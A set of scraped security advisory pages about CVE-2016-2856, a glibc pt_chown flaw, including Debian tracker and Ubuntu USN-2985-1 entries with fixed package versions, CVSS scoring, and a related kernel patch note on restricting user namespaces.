=== Content from security-tracker.debian.org_f025a091_20250126_032425.html ===

# CVE-2016-2856

| **Name** | CVE-2016-2856 |
| --- | --- |
| **Description** | pt\_chown in the glibc package before 2.19-18+deb8u4 on Debian jessie; the elibc package before 2.15-0ubuntu10.14 on Ubuntu 12.04 LTS and before 2.19-0ubuntu6.8 on Ubuntu 14.04 LTS; and the glibc package before 2.21-0ubuntu4.2 on Ubuntu 15.10 and before 2.23-0ubuntu1 on Ubuntu 16.04 LTS and 16.10 lacks a namespace check associated with file-descriptor passing, which allows local users to capture keystrokes and spoof data, and possibly gain privileges, via pts read and write operations, related to debian/sysdeps/linux.mk. NOTE: this is not considered a vulnerability in the upstream GNU C Library because the upstream documentation has a clear security recommendation against the --enable-pt\_chown option. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2016-2856) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-2856); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2016-2856), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-2856), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2016-2856), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2016-2856), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-2856), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-2856), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2016-2856), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2016-2856)/[CVE](https://www.suse.com/security/cve/CVE-2016-2856/), GitHub [advisories](https://github.com/advisories?query=CVE-2016-2856)/[code](https://github.com/search?type=Code&q=%22CVE-2016-2856%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2016-2856%22), [web search](https://duckduckgo.com/html?q=%22CVE-2016-2856%22), [more](https://oss-security.openwall.org/wiki/vendors)) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [glibc](/tracker/source-package/glibc) ([PTS](https://tracker.debian.org/pkg/glibc)) | bullseye | 2.31-13+deb11u11 | fixed |
|  | bullseye (security) | 2.31-13+deb11u10 | fixed |
|  | bookworm | 2.36-9+deb12u9 | fixed |
|  | bookworm (security) | 2.36-9+deb12u7 | fixed |
|  | trixie | 2.40-5 | fixed |
|  | sid | 2.40-6 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [eglibc](/tracker/source-package/eglibc) | source | (unstable) | (unfixed) |  |  |  |
| [glibc](/tracker/source-package/glibc) | source | jessie | 2.19-18+deb8u4 |  |  |  |
| [glibc](/tracker/source-package/glibc) | source | (unstable) | 2.21-1 | low |  |  |

## Notes

```
[squeeze] - eglibc <no-dsa> (Minor issue)
[wheezy] - eglibc <no-dsa> (Minor issue)
<http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=09f7764882a81e13e7b5d87d715412283a6ce403>
<http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=11475c083282c1582c4dd72eecfcb2b7d308c958>
<https://www.openwall.com/lists/oss-security/2016/03/07/2>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from www.ubuntu.com_6804490a_20250124_204518.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2985-1: GNU C Library vulnerabilities

25 May 2016

Several security issues were fixed in the GNU C Library.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 15.10](/security/notices?release=wily)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)
* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [eglibc](/security/cves?package=eglibc) - GNU C Library
* [glibc](/security/cves?package=glibc) - GNU C Library

## Details

Martin Carpenter discovered that pt\_chown in the GNU C Library did not

properly check permissions for tty files. A local attacker could use this

to gain administrative privileges or expose sensitive information.

([CVE-2013-2207](/security/CVE-2013-2207), [CVE-2016-2856](/security/CVE-2016-2856))

Robin Hack discovered that the Name Service Switch (NSS) implementation in

the GNU C Library did not properly manage its file descriptors. An attacker

could use this to cause a denial of service (infinite loop).

([CVE-2014-8121](/security/CVE-2014-8121))

Joseph Myers discovered that the GNU C Library did not properly handle long

arguments to functions returning a representation of Not a Number (NaN). An

attacker could use this to cause a denial of service (stack exhaustion

leading to an application crash) or possibly execute arbitrary code.

([CVE-2014-9761](/security/CVE-2014-9761))

Arjun Shankar discovered that in certain situations the nss\_dns code in the

GNU C Library did not properly account buffer sizes when passed an

unaligned buffer. An attacker could use this to cause a denial of service

or possibly execute arbitrary code. ([CVE-2015-1781](/security/CVE-2015-1781))

Sumit Bose and Lukas Slebodnik discovered that the Name Service

Switch (NSS) implementation in the GNU C Library did not handle long

lines in the files databases correctly. A local attacker could use

this to cause a denial of service (application crash) or possibly

execute arbitrary code. ([CVE-2015-5277](/security/CVE-2015-5277))

Adam Nielsen discovered that the strftime function in the GNU C Library did

not properly handle out-of-range argument data. An attacker could use this

to cause a denial of service (application crash) or possibly expose

sensitive information. ([CVE-2015-8776](/security/CVE-2015-8776))

Hector Marco and Ismael Ripoll discovered that the GNU C Library allowed

the pointer-guarding protection mechanism to be disabled by honoring the

LD\_POINTER\_GUARD environment variable across privilege boundaries. A local

attacker could use this to exploit an existing vulnerability more easily.

([CVE-2015-8777](/security/CVE-2015-8777))

Szabolcs Nagy discovered that the hcreate functions in the GNU C Library

did not properly check its size argument, leading to an integer overflow.

An attacker could use to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8778](/security/CVE-2015-8778))

Maksymilian Arciemowicz discovered a stack-based buffer overflow in the

catopen function in the GNU C Library when handling long catalog names. An

attacker could use this to cause a denial of service (application crash) or

possibly execute arbitrary code. ([CVE-2015-8779](/security/CVE-2015-8779))

Florian Weimer discovered that the getnetbyname implementation in the GNU C

Library did not properly handle long names passed as arguments. An attacker

could use to cause a denial of service (stack exhaustion leading to an

application crash). ([CVE-2016-3075](/security/CVE-2016-3075))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 15.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.2](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.2)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.21-0ubuntu4.2](https://launchpad.net/ubuntu/%2Bsource/glibc/2.21-0ubuntu4.2)

##### Ubuntu 14.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.8)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.19-0ubuntu6.8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.19-0ubuntu6.8)

##### Ubuntu 12.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.14](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.14)
* [libc6-dev](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.15-0ubuntu10.14](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.15-0ubuntu10.14)

After a standard system update you need to reboot your computer to

make all the necessary changes.

## References

* [CVE-2013-2207](/security/CVE-2013-2207)
* [CVE-2014-8121](/security/CVE-2014-8121)
* [CVE-2014-9761](/security/CVE-2014-9761)
* [CVE-2015-1781](/security/CVE-2015-1781)
* [CVE-2015-5277](/security/CVE-2015-5277)
* [CVE-2015-8776](/security/CVE-2015-8776)
* [CVE-2015-8777](/security/CVE-2015-8777)
* [CVE-2015-8778](/security/CVE-2015-8778)
* [CVE-2015-8779](/security/CVE-2015-8779)
* [CVE-2016-2856](/security/CVE-2016-2856)
* [CVE-2016-3075](/security/CVE-2016-3075)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lkml.org_a0476ce9_20250126_032425.html ===


| [lkml.org](/) | Â | [[lkml]](/lkml) Â  [[2016]](/lkml/2016) Â  [[Jan]](/lkml/2016/1) Â  [[22]](/lkml/2016/1/22) Â  [[last100]](/lkml/last100) Â  [RSS Feed](/rss.php)Views: [wrap][no wrap] Â  [[headers]](/lkml/mheaders/2016/1/22/7)Â  [[forward]](/lkml/bounce/2016/1/22/7)Â | Â |
| --- | --- | --- | --- |
| Messages in this thread  * [First message in thread](/lkml/2016/1/22/7) * [Kees Cook](/lkml/2016/1/22/8)   + [Kees Cook](/lkml/2016/1/22/8)     - [=?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?=](/lkml/2016/1/22/11)       * [Kees Cook](/lkml/2016/1/22/13)         + [=?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?=](/lkml/2016/1/22/14)   + [Kees Cook](/lkml/2016/1/22/9)     - [(Eric W. Biederman)](/lkml/2016/1/22/175)       * [Jann Horn](/lkml/2016/1/23/258)         + [(Eric W. Biederman)](/lkml/2016/1/23/292)   + [Richard Weinberger](/lkml/2016/1/22/12)   + [(Eric W. Biederman)](/lkml/2016/1/22/174)     - [Kees Cook](/lkml/2016/1/24/158)       * [Serge Hallyn](/lkml/2016/1/26/48)     - [Andy Lutomirski](/lkml/2016/1/24/244)       * [Kees Cook](/lkml/2016/1/25/1006)         + [Andy Lutomirski](/lkml/2016/1/25/1010) | / | | | From | Kees Cook <> | | --- | --- | | Subject | [PATCH 0/2] sysctl: allow CLONE\_NEWUSER to be disabled | | Date | Fri, 22 Jan 2016 14:39:03 -0800 | |  | | --- | --- | --- | --- | --- | --- | --- | --- |  ``` There continues to be unexpected side-effects and security exposuresvia CLONE_NEWUSER. For many end-users running distro kernels withCONFIG_USER_NS enabled, there is no way to disable this feature whendesired. As such, this creates a sysctl to restrict CLONE_NEWUSER soadmins not running containers or Chrome can avoid the risks of thisfeature.-Kees ``` | \ |
| Â |
| Â | \ | Â | / |
| Â | | Last update: 2016-01-23 00:01 Â Â  [from the cache]Â©2003-2020 [Jasper Spaans](http://blog.jasper.es/)|hosted at [Digital Ocean](https://www.digitalocean.com/?refcode=9a8e99d24cf9) and my Meterkast|[Read the blog](http://blog.jasper.es/categories.html#lkml-ref) | Â |



=== Content from people.canonical.com_a0f80756_20250124_204511.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2016-2856

Publication date 13 March 2016

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**Medium**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg)

**8.4 · High**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

pt\_chown in the glibc package before 2.19-18+deb8u4 on Debian jessie; the
elibc package before 2.15-0ubuntu10.14 on Ubuntu 12.04 LTS and before
2.19-0ubuntu6.8 on Ubuntu 14.04 LTS; and the glibc package before
2.21-0ubuntu4.2 on Ubuntu 15.10 and before 2.23-0ubuntu1 on Ubuntu 16.04
LTS and 16.10 lacks a namespace check associated with file-descriptor
passing, which allows local users to capture keystrokes and spoof data, and
possibly gain privileges, via pts read and write operations, related to
debian/sysdeps/linux.mk. NOTE: this is not considered a vulnerability in
the upstream GNU C Library because the upstream documentation has a clear
security recommendation against the --enable-pt\_chown option.

## From the Ubuntu Security Team

Martin Carpenter discovered that pt\_chown in the GNU C Library
did not properly check permissions for tty files. A local attacker
could use this to gain administrative privileges or expose sensitive
information.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| eglibc | 17.04 zesty | Not in release |
| 16.10 yakkety | Not in release |
| 16.04 LTS xenial | Not in release |
| 15.10 wily | Not in release |
| 14.04 LTS trusty | Fixed 2.19-0ubuntu6.8 |
| 12.04 LTS precise | Fixed 2.15-0ubuntu10.14 |
| glibc | 17.04 zesty | Not affected |
| 16.10 yakkety | Not affected |
| 16.04 LTS xenial | Not affected |
| 15.10 wily | Fixed 2.21-0ubuntu4.2 |
| 14.04 LTS trusty | Not in release |
| 12.04 LTS precise | Not in release |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)
* [Patch details](#patch-details)

### Patch details

For informational purposes only. We recommend not to cherry-pick updates. [How can I get the fixes?](/security/cves/about#security)

| Package | Patch details |
| --- | --- |
| glibc | * Upstream:   <https://sourceware.org/git/?p=glibc.git;a=commit;h=77356912e83601fd0240d22fe4d960348b82b5c3> |

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 8.4 · High |
| Attack vector | Local |
| Attack complexity | Low |
| Privileges required | None |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2856)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2016-2856)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2016-2856)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2016-2856)

### Related Ubuntu Security Notices (USN)

+ [USN-2985-1](https://usn.ubuntu.com/USN-2985-1)
+ GNU C Library vulnerabilities
+ 25 May 2016

### Other references

* <http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=09f7764882a81e13e7b5d87d715412283a6ce403>
* <http://anonscm.debian.org/cgit/pkg-glibc/glibc.git/commit/?h=jessie&id=11475c083282c1582c4dd72eecfcb2b7d308c958>
* <http://www.openwall.com/lists/oss-security/2016/03/07/2>
* <https://www.cve.org/CVERecord?id=CVE-2016-2856>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lists.ubuntu.com_be8ed54b_20250126_032413.html ===


| **ubuntu-hardened -- Ubuntu security discussion** | |
| --- | --- |
|  | |
| **About ubuntu-hardened** | English (USA)   Chinese (Taiwan) |
| Discussion on Ubuntu security updates, development of new security technologies, and general "hardening" of the operating system.  A place to talk about MAC systems (SELinux, AppArmor, Smack) in Ubuntu, about both kernel-level and user-land security improvements and technologies, etc.  To see the collection of prior postings to the list, visit the [ubuntu-hardened Archives](https://lists.ubuntu.com/archives/ubuntu-hardened). | |
| **Using ubuntu-hardened** | |
| To post a message to all the list members, send email to ubuntu-hardened@lists.ubuntu.com. You can subscribe to the list, or change your existing subscription, in the sections below. | |
| **Subscribing to ubuntu-hardened** | |
| Subscribe to ubuntu-hardened by filling out the following form. You will be sent email requesting confirmation, to prevent others from gratuitously subscribing you. This is a hidden list, which means that the list of members is available only to the list administrator.    | Your email address: |  |  | | --- | --- | --- | | Your name (optional): |  |  | | You may enter a privacy password below. This provides only mild security, but should prevent others from messing with your subscription. **Do not use a valuable password** as it will occasionally be emailed back to you in cleartext. If you choose not to enter a password, one will be automatically generated for you, and it will be sent to you once you've confirmed your subscription. You can always request a mail-back of your password when you edit your personal options. | | | | Pick a password: |  |  | | Reenter password to confirm: |  |  | | Which language do you prefer to display your messages? | English (USA)   Chinese (Taiwan) |  | | Would you like to receive list mail batched in a daily digest? | No  Yes | |  | | | | |

| **ubuntu-hardened Subscribers** | |
| (*The subscribers list is only available to the list administrator.*) Enter your admin address and password to visit the subscribers list: Admin address: Password:  To unsubscribe from ubuntu-hardened, get a password reminder, or change your subscription options enter your subscription email address: If you leave the field blank, you will be prompted for your email address | |

---

[ubuntu-hardened](../listinfo/ubuntu-hardened) list run by jamie at ubuntu.com, mdeslaur at ubuntu.com, sbeattie at ubuntu.com, alex.murray at canonical.com
[ubuntu-hardened administrative interface](../admin/ubuntu-hardened) (requires authorization)
[Overview of all lists.ubuntu.com mailing lists](../listinfo)

| [Delivered by Mailmanversion 2.1.20](http://www.gnu.org/software/mailman/index.html) | [Python Powered](http://www.python.org/) | [GNU's Not Unix](http://www.gnu.org/) | [Debian Powered](http://www.debian.org/) |
| --- | --- | --- | --- |

[![](http://tuxedo-es.org/images/hardened_debian.png)](http://www.debian-hardened.org)



=== Content from usn.ubuntu.com_e83b73ef_20250126_032414.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-2985-1: GNU C Library vulnerabilities

25 May 2016

Several security issues were fixed in the GNU C Library.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 15.10](/security/notices?release=wily)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)
* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [eglibc](/security/cves?package=eglibc) - GNU C Library
* [glibc](/security/cves?package=glibc) - GNU C Library

## Details

Martin Carpenter discovered that pt\_chown in the GNU C Library did not

properly check permissions for tty files. A local attacker could use this

to gain administrative privileges or expose sensitive information.

([CVE-2013-2207](/security/CVE-2013-2207), [CVE-2016-2856](/security/CVE-2016-2856))

Robin Hack discovered that the Name Service Switch (NSS) implementation in

the GNU C Library did not properly manage its file descriptors. An attacker

could use this to cause a denial of service (infinite loop).

([CVE-2014-8121](/security/CVE-2014-8121))

Joseph Myers discovered that the GNU C Library did not properly handle long

arguments to functions returning a representation of Not a Number (NaN). An

attacker could use this to cause a denial of service (stack exhaustion

